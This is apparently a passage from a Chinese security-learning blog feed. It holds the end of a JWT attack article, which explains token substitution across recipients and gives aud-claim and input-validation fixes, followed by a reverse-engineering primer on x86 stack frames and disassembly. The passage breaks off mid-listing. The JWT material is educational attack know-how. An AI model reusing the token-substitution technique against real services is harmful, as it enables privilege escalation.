data-url=\"aHR0cDovL2Jsb2dzLmFkb2JlLmNvbS9zZWN1cml0eS8yMDE3LzAzL2NyaXRpY2FsLXZ1bG5lcmFiaWxpdHktdW5jb3ZlcmVkLWluLWpzb24tZW5jcnlwdGlvbi5odG1s\">critical-vulnerability-uncovered-in-json-encryption</span>。</p>\n<p><strong>解决对策：</strong></p>\n<blockquote>\n<p>检查传递给任何公共函数的所有输入是否有效是解决这类攻击的关键点。验证内容包括公钥是所选曲线的有效椭圆曲线点，以及私钥位于有效值范围内。</p>\n</blockquote>\n<h4 id=\"7-替换攻击\"><a class=\"markdownIt-Anchor\" href=\"#7-替换攻击\">#</a> 7. 替换攻击</h4>\n<p>在这种攻击中，攻击者需要至少获得两种不同的 JWT，然后攻击者可以将令牌中的一个或者两个用在其他的地方。</p>\n<p>在 JWT 中，替换共叽有两种方式，我们称他们为相同接收方攻击（跨越式 JWT）和不同接收方攻击。</p>\n<p><strong>不同接收方攻击</strong></p>\n<p>我们可以设想一个业务逻辑如下：</p>\n<blockquote>\n<p>Auth 机构，有着自己的私钥，并且给 App1 和 App2 发放了两个公钥，用于验证签名；</p>\n<p>Attacker 利用自己的秘钥登录了 App1。</p>\n</blockquote>\n<p>此时 Auth 机构给 Attacker 下发了一个 附带签名的 JWT，其 payload 内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;uname&#x27;:&#x27;Attacker&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;role&#x27; :&#x27;admin&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>此时，如果 Attacker 知道 App1 和 App2 的公钥是同一个 Auth 签发的话，他可以利用这个 JWT 去登录 App2，从而获取 Admin 权限。</p>\n<p><strong>解决方法：</strong></p>\n<blockquote>\n<p>在 jwt 中带上 aud 声明，比如 aud : App1 这样。来限定该 jwt 只能用于 App1。</p>\n</blockquote>\n<p><strong>相同接收方攻击 / 跨越式 JWT same recipient/Cross JWT</strong></p>\n<p>我们可以设想一个业务逻辑如下：</p>\n<blockquote>\n<p>在同一站点下，有两个应用程序，wordpress 和 phpmyadmin，他们都利用了相同的秘钥对和算法来验证 JWT 签名；</p>\n<p>站点管理员知道 Different Recipient 的问题，所以给 wordpress 的应用增加了 aud 验证，但是 phpmyadmin 的用户人数较少，没有增加 aud 的验证；</p>\n<p>Attacker 利用自己的秘钥登录了 wordpress。</p>\n</blockquote>\n<p>此时 站点 给 Attacker 下发了一个 附带签名的 JWT，其 payload 内容为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;uname&#x27;:&#x27;Attacker&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;role&#x27; :&#x27;writer&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;aud&#x27; :&#x27;shaobaobaoer.cn/wordpress&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x27;iss&#x27; :&#x27;shaobaobaoer.cn&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这个 JWT 看似非常安全，但这仅仅是对于 wordpress 的应用程序而言，。从而 Attacker 可以以 writer 的身份登录 phpmyadmin。</p>\n<h3 id=\"例题\"><a class=\"markdownIt-Anchor\" href=\"#例题\">#</a> 例题</h3>\n<p>ctfshow 345-350</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucnVub29iLmNvbS9qc3JlZi9wcm9wLXdpbi1sb2NhbHN0b3JhZ2UuaHRtbA==\">Window localStorage 属性 | 菜鸟教程 (runoob.com)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qYXZhZ3VpZGUuY24vc3lzdGVtLWRlc2lnbi9zZWN1cml0eS9qd3QtaW50cm8uaHRtbCMlRTUlQTYlODIlRTQlQkQlOTUlRTklOTglQjIlRTYlQUQlQTItand0LSVFOCVBMiVBQiVFNyVBRiVBMSVFNiU5NCVCOQ==\">JWT 基础概念详解 (javaguide.cn)</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\">JSON Web Tokens - jwt.io</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MDg3NC5odG1s\">https://www.freebuf.com/articles/web/180874.html</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vYXJ0aWNsZXMvd2ViLzE4MTI2MS5odG1s\">https://www.freebuf.com/articles/web/181261.html</span></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/11/11/reverse/",
            "url": "http://example.com/2022/11/11/reverse/",
            "title": "逆向",
            "date_published": "2022-11-11T05:38:45.000Z",
            "content_html": "<h2 id=\"c与汇编的关系\"><a class=\"markdownIt-Anchor\" href=\"#c与汇编的关系\">#</a> C 与汇编的关系</h2>\n<h3 id=\"应用层技术栈\"><a class=\"markdownIt-Anchor\" href=\"#应用层技术栈\">#</a> 应用层技术栈：</h3>\n<ol>\n<li>加密与解密（四）看雪论坛</li>\n<li>X86/X64/arm 汇编语言</li>\n<li>windows 核心编程</li>\n<li>c 语言从入门到精通 (第三版) （清华）</li>\n</ol>\n<h3 id=\"学习逆向环境配置\"><a class=\"markdownIt-Anchor\" href=\"#学习逆向环境配置\">#</a> 学习逆向环境配置</h3>\n<p>工具类：</p>\n<ul>\n<li>吾爱破解工具类</li>\n<li>Hxd (十六进制编辑工具)</li>\n</ul>\n<p>开发类：</p>\n<ol>\n<li>VS2008 IDE</li>\n<li>VC6.0 SP6 IDE</li>\n</ol>\n<h3 id=\"进制转换\"><a class=\"markdownIt-Anchor\" href=\"#进制转换\">#</a> 进制转换</h3>\n<ol>\n<li>十进制的定义：由十个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 逢十进一</li>\n<li>九进制的定义：由九个符号组成，分别是 0 1 2 3 4 5 6 7 8 逢九进一</li>\n<li>十六进制的定义：由十六个符号组成，分别是 0 1 2 3 4 5 6 7 8 9 A B C D E F</li>\n<li>N 进制的定义：由 N 个符号组成 逢 N 进一</li>\n</ol>\n<h3 id=\"数据类型与逻辑运算\"><a class=\"markdownIt-Anchor\" href=\"#数据类型与逻辑运算\">#</a> 数据类型与逻辑运算</h3>\n<p>在计算机中，由于硬件的制约，数据是有长度限制的，超过数据宽度的数据会被丢弃</p>\n<p>同一个数据，表示无符号数和有符号数则其含义不同</p>\n<ol>\n<li>无符号数：正数</li>\n<li>有符号数：正数、负数</li>\n</ol>\n<h3 id=\"常见的数据类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的数据类型重要\">#</a> 常见的数据类型（重要）</h3>\n<ul>\n<li>BYTE                    字节          8BIT</li>\n<li>WORD                 字             16BIT 2 字节</li>\n<li>DWORD              双字          32BIT 4 字节</li>\n</ul>\n<h3 id=\"常见的运算符类型重要\"><a class=\"markdownIt-Anchor\" href=\"#常见的运算符类型重要\">#</a> <strong>常见的运算符类型（重要）</strong></h3>\n<p><strong>或运算（or |）</strong></p>\n<p>只要有一个为 1 则结果为 1</p>\n<p><strong>与运算（and &amp;）</strong></p>\n<p>两个都是 1 结果才为 1</p>\n<p><strong>异或运算（xor ^）</strong></p>\n<p>相同为 0 不同为 1</p>\n<p><strong>非运算 (not !)</strong></p>\n<p>取反 1 是 0 0 是 1</p>\n<h3 id=\"32位寄存器\"><a class=\"markdownIt-Anchor\" href=\"#32位寄存器\">#</a> 32 位寄存器</h3>\n<p>EAX</p>\n<p>EBX</p>\n<p>ECX</p>\n<p>EDX</p>\n<p>只有通用寄存器能拆成高位和低位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov byte [local.3+2],ah     //由于只是高位地址，因此是3+2</span><br><span class=\"line\">mov byte [local.3+3],ah     //同时注意是byte，所以是2</span><br></pre></td></tr></table></figure>\n<p>command 中</p>\n<p>?al 可以显示 al 中的值，即查看寄存器中的值</p>\n<p>dd  内存 display dword</p>\n<p>dw 内存</p>\n<p>db 内存</p>\n<h3 id=\"cpu计算23\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算23\">#</a> CPU 计算 2+3</h3>\n<p>1. 先异或，得到 R</p>\n<p>2. 在与运算，将结果左移一位</p>\n<p>3. 如果 (2) 的结果为全 0，那么 R 就是最终答案，如果不是，将 R 赋值给 x，将 (2) 的结果赋值给 y</p>\n<p>4. 重复操作直至 (2) 的结果为全 0，那么此时 R 就是我们的答案</p>\n<h3 id=\"cpu计算2-3\"><a class=\"markdownIt-Anchor\" href=\"#cpu计算2-3\">#</a> CPU 计算 2-3</h3>\n<p>1. 异或，得到 R</p>\n<p>2. 在与运算，将结果再左移一位</p>\n<p>3. 如果结果为全 0，那么 R 就是结果，否则重复</p>\n<p>在 debug 的模式下是用常量来分配的 print hello world</p>\n<h3 id=\"堆栈的原理\"><a class=\"markdownIt-Anchor\" href=\"#堆栈的原理\">#</a> 堆栈的原理：</h3>\n<ol>\n<li>临时存放一些寄存器已无法存放的数据，比如超过内存对齐的数据类型</li>\n<li>存放临时数据，野指针，指针初始化时的数据</li>\n</ol>\n<p>Windows 分配栈时 是从高地址往低地址分配:</p>\n<ol>\n<li>MOV EBX,0x13FFDC        BASE</li>\n<li>MOV EDX,0x13FFDC        TOP</li>\n</ol>\n<p>EBP 和 ESP：</p>\n<p>ESP：该指针永远指向系统栈最上面一个栈帧的栈顶。</p>\n<p>EBP：该指针永远指向系统栈最上面一个栈帧的底部。</p>\n<p>栈底和栈顶原理：</p>\n<ol>\n<li>控制栈顶和栈底分别为两个固定的寄存器 (EBP 基址指针寄存器 和 ESP 堆栈指针寄存器）</li>\n</ol>\n<p>ebp = esp</p>\n<p>esp -= 0x40</p>\n<p><img data-src=\"https://cdn.nlark.com/yuque/0/2022/png/2759285/1654236227177-d37c824f-e09f-4e3d-9a41-c4d81ee6de30.png\" alt=\"img\"></p>\n<p>ESP 和 EBP 不够的时候会相互借用，两个都用作传参</p>\n<p>初始状态下，ebp 指向高地址，ESP 指向低地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095016154.png\" alt=\"image-20221105095016154\"></p>\n<p>push eax</p>\n<blockquote>\n<p>先把 esp-4，再把 eax 中的值压栈</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095049237.png\" alt=\"image-20221105095049237\"></p>\n<p>pop eax</p>\n<blockquote>\n<p>将 esp 指向的值给 eax，esp+4</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105095144317.png\" alt=\"image-20221105095144317\"></p>\n<h4 id=\"一个helloworld的main函数\"><a class=\"markdownIt-Anchor\" href=\"#一个helloworld的main函数\">#</a> 一个 helloworld 的 main 函数</h4>\n<p>一般来说，VC 6.0 的 main 函数在  <code>call 00401005</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105093859109.png\" alt=\"image-20221105093859109\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401005  /$ /E9 06000000   jmp     main</span><br><span class=\"line\">0040100A  |  |CC            int3</span><br><span class=\"line\">0040100B  |  |CC            int3</span><br><span class=\"line\">0040100C  |  |CC            int3</span><br><span class=\"line\">0040100D  |  |CC            int3</span><br><span class=\"line\">0040100E  |  |CC            int3</span><br><span class=\"line\">0040100F  |  |CC            int3</span><br><span class=\"line\">00401010 &gt;|&gt; \\55            push    ebp</span><br><span class=\"line\">00401011  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401013  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">00401016  |.  53            push    ebx</span><br><span class=\"line\">00401017  |.  56            push    esi</span><br><span class=\"line\">00401018  |.  57            push    edi</span><br><span class=\"line\">00401019  |.  8D7D C0       lea     edi,[local.16]</span><br><span class=\"line\">0040101C  |.  B9 10000000   mov     ecx,0x10</span><br><span class=\"line\">00401021  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC</span><br><span class=\"line\">00401026  |.  F3:AB         rep     stos dword ptr es:[edi]</span><br><span class=\"line\">00401028  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040102D  |.  E8 2E000000   call    printf                           ; \\printf</span><br><span class=\"line\">00401032  |.  83C4 04       add     esp,0x4</span><br><span class=\"line\">00401035  |.  33C0          xor     eax,eax</span><br><span class=\"line\">00401037  |.  5F            pop     edi</span><br><span class=\"line\">00401038  |.  5E            pop     esi</span><br><span class=\"line\">00401039  |.  5B            pop     ebx</span><br><span class=\"line\">0040103A  |.  83C4 40       add     esp,0x40</span><br><span class=\"line\">0040103D  |.  3BEC          cmp     ebp,esp</span><br><span class=\"line\">0040103F  |.  E8 9C000000   call    _chkesp</span><br><span class=\"line\">00401044  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">00401046  |.  5D            pop     ebp</span><br><span class=\"line\">00401047  \\.  C3            retn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>假设当前我们有这样一个程序</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// add_main.cpp : Defines the entry point for the console application.</span></span><br><span class=\"line\"><span class=\"comment\">//</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&quot;stdafx.h&quot;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> m, <span class=\"type\">int</span> n)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span>* argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"type\">int</span> m=<span class=\"number\">3</span>,n=<span class=\"number\">4</span>;</span><br><span class=\"line\">\t<span class=\"built_in\">func</span>(m,n);</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Hello World!\\n&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在调用 func 之前，main 的栈帧：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100143457.png\" alt=\"image-20221105100143457\"></p>\n<p>从低地址 esp 到高地址 ebp 的这块区域，就是当前 main 函数的栈帧。当 main 中调用 func 时，写成汇编大致是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push m</span><br><span class=\"line\">push n; 两个参数压入栈</span><br><span class=\"line\">call func; 调用func，将返回地址填入栈，并跳转到func</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401078  |.  C745 FC 03000&gt;mov     dword ptr ss:[ebp-0x4],0x3</span><br><span class=\"line\">0040107F  |.  C745 F8 04000&gt;mov     dword ptr ss:[ebp-0x8],0x4</span><br><span class=\"line\">00401086  |.  8B45 F8       mov     eax,dword ptr ss:[ebp-0x8]</span><br><span class=\"line\">00401089  |.  50            push    eax</span><br><span class=\"line\">0040108A  |.  8B4D FC       mov     ecx,dword ptr ss:[ebp-0x4]</span><br><span class=\"line\">0040108D  |.  51            push    ecx</span><br><span class=\"line\">0040108E  |.  E8 72FFFFFF   call    00401005</span><br><span class=\"line\">00401093  |.  83C4 08       add     esp,0x8</span><br><span class=\"line\">00401096  |.  68 1C204200   push    0042201C                         ; /format = &quot;Hello World!</span><br><span class=\"line\">&quot;</span><br><span class=\"line\">0040109B  |.  E8 30000000   call    printf                           ; \\printf</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105100732747.png\" alt=\"image-20221105100732747\"></p>\n<p>当跳转到了 func，来看看 func 的汇编大致的样子：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401020 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401021  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401023  |.  83EC 48       sub     esp,0x48</span><br><span class=\"line\">00401026  |.  53            push    ebx</span><br><span class=\"line\">00401027  |.  56            push    esi</span><br><span class=\"line\">00401028  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>push ebp 需要保存 main 的栈底，因为现在到了一个新的函数，但栈顶不需要保存，因为上一个栈帧的顶部讲会是 func 的栈帧底部。（两栈帧相邻的）</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101018994.png\" alt=\"image-20221105101018994\"></p>\n<p>到这里，新的栈帧开始了</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov     eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x4],eax</span><br><span class=\"line\">mov     ecx,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">mov     dword ptr ss:[ebp-0x8],ecx</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105101240579.png\" alt=\"image-20221105101240579\"></p>\n<p>retn   ; 返回，然后 8 是什么意思呢，就是参数占用的字节数，当返回后，esp-n，释放参数 m,n 的空间</p>\n<p>由此可见，通过 ebp，能够很容易定位到上面的参数。当从 func 函数返回时，首先 esp 移动到栈帧底部（即释放局部变量），然后把上一个函数的栈帧底部指针弹出到 ebp, 再弹出返回地址到 cs:ip 上，esp 继续移动划过参数，这样，ebp,esp 就回到了调用函数前的状态，即现在恢复了原来的 main 的栈帧</p>\n<p>大佬的文章：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1R1eGVkb0xpbnV4L2FydGljbGUvZGV0YWlscy8xMDA5MjE5OTQ=\">栈帧 ebp,esp 详解_TuxedoLinux 的博客 - CSDN 博客_ebp esp</span></p>\n<h4 id=\"提升堆栈\"><a class=\"markdownIt-Anchor\" href=\"#提升堆栈\">#</a> <strong>提升堆栈</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401060 &gt;/&gt; \\55            push    ebp</span><br><span class=\"line\">00401061  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">00401063  |.  83EC 48       sub     esp,0x40</span><br></pre></td></tr></table></figure>\n<p>将堆栈提升了 0x40</p>\n<p>将 esp 的值减去 0x40=64，我们这里的相差的数据宽度为 4 即 16,64/4=16，因此堆栈图里多了 16 格（蓝色部分），这种操作常被叫做<strong>提升堆栈</strong>，此时堆栈图为：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228212917496.png\" alt=\"image-20210228212917496\" style=\"zoom:50%;\" />\n<p>此时 ESP 指向新的栈顶，蓝色区域为我们 CALL 0040100A 之后新的栈，下面的区域为原来的栈</p>\n<p>此时蓝色中的数据为脏数据，因为栈中放的是临时数据，可能是之前没有清理的数据</p>\n<h4 id=\"保护现场\"><a class=\"markdownIt-Anchor\" href=\"#保护现场\">#</a> <strong>保护现场</strong></h4>\n<p>对应语句为</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401066  |.  53            push    ebx</span><br><span class=\"line\">00401067  |.  56            push    esi</span><br><span class=\"line\">00401068  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>将 ebx、esi、edi 三个通用寄存器保存到堆栈中，前面的 push ebp 其实也属于保护现场</p>\n<h4 id=\"初始化提升的堆栈\"><a class=\"markdownIt-Anchor\" href=\"#初始化提升的堆栈\">#</a> <strong>初始化提升的堆栈</strong></h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401069  |.  8D7D B8       lea     edi,dword ptr ss:[ebp-0x48]  ;就是将刚开始的esp给的edi</span><br><span class=\"line\">0040106C  |.  B9 12000000   mov     ecx,0x12     ;ecx是为了之后的rep做准备的，ecx是rep循环次数</span><br><span class=\"line\">00401071  |.  B8 CCCCCCCC   mov     eax,0xCCCCCCCC     ;使用CC防止缓冲溢出</span><br><span class=\"line\">00401076  |.  F3:AB         rep     stos dword ptr es:[edi]  ;将eax的值赋值给edi所指向的内存地址里的值，并且每执行一次edi都会增加4（D标志位为0所以是增加</span><br></pre></td></tr></table></figure>\n<p>这里将我们提升的堆栈中的内容全部初始化为 CCCCCCCC</p>\n<p>为什么是初始化为 CC？防止<strong>缓冲</strong>溢出</p>\n<p>CC 的<strong>硬编码</strong>对应的指令为 int 3，即断点</p>\n<p>这么做有什么好处呢？当程序执行超过缓冲区时，遇到 int 3 就会自动停下来</p>\n<h4 id=\"执行实际的内容\"><a class=\"markdownIt-Anchor\" href=\"#执行实际的内容\">#</a> 执行实际的内容</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401058 |. 8B45 08    mov eax,dword ptr ss:[ebp+0x8]</span><br><span class=\"line\">0040105B |. 0345 0C    add eax,dword ptr ss:[ebp+0xC]</span><br></pre></td></tr></table></figure>\n<p>就是将前面压入的参数 2 和 1 进行相加得到 3</p>\n<h4 id=\"恢复现场\"><a class=\"markdownIt-Anchor\" href=\"#恢复现场\">#</a> 恢复现场</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00401145  |.  5F            pop     edi</span><br><span class=\"line\">00401146  |.  5E            pop     esi</span><br><span class=\"line\">00401147  |.  5B            pop     ebx</span><br><span class=\"line\">00401148  |.  8BE5          mov     esp,ebp</span><br><span class=\"line\">0040114A  |.  5D            pop     ebp</span><br></pre></td></tr></table></figure>\n<p>与前面保护现场相对应</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20210228224826624.png\" alt=\"image-20210228224826624\" style=\"zoom:50%;\" />\n<h4 id=\"返回\"><a class=\"markdownIt-Anchor\" href=\"#返回\">#</a> 返回</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040114B  \\.  C3            retn</span><br></pre></td></tr></table></figure>\n<h4 id=\"call返回后\"><a class=\"markdownIt-Anchor\" href=\"#call返回后\">#</a> CALL 返回后</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0040112B  |.  83C4 0C       add     esp,0xC</span><br></pre></td></tr></table></figure>\n<p>作用为平衡堆栈</p>\n<p>注意 CALL 之前和 CALL 之后，其前后环境要一致，这就是所谓的<strong>堆栈平衡</strong></p>\n<h4 id=\"堆栈平衡\"><a class=\"markdownIt-Anchor\" href=\"#堆栈平衡\">#</a> 堆栈平衡</h4>\n<p>如果通过堆栈传递参数了。那么在程序执行完毕后，要平衡因参数导致的堆栈变化</p>\n<p>当我们使用堆栈传参的时候，在程序执行完毕后这些参数应该一起被清理掉，也就是加了几条参数，就要在堆栈中加几个地址，这么做可以理解为清理垃圾。</p>\n<p>处理方法：</p>\n<p>第一种 ：在函数外部添加 ADD 处理</p>\n<p>第二种：在函数内部添加 ret8</p>\n<h4 id=\"逆推c语言代码\"><a class=\"markdownIt-Anchor\" href=\"#逆推c语言代码\">#</a> 逆推 C 语言代码</h4>\n<p>根据我们前面的分析，我们不难发现这其实就是个简单的加法函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void func(int m, int n) &#123;</span><br><span class=\"line\">    int a, b;</span><br><span class=\"line\">    a = m;</span><br><span class=\"line\">    b = n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuNTJwb2ppZS5jbi90aHJlYWQtMTM3OTk1Mi0xLTEuaHRtbA==\">逆向基础笔记七 堆栈图（重点） - 『软件调试区』 - 吾爱破解 - LCG - LSG | 安卓破解 | 病毒分析 | www.52pojie.cn</span></p>\n<p>我们最后在总结一下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span 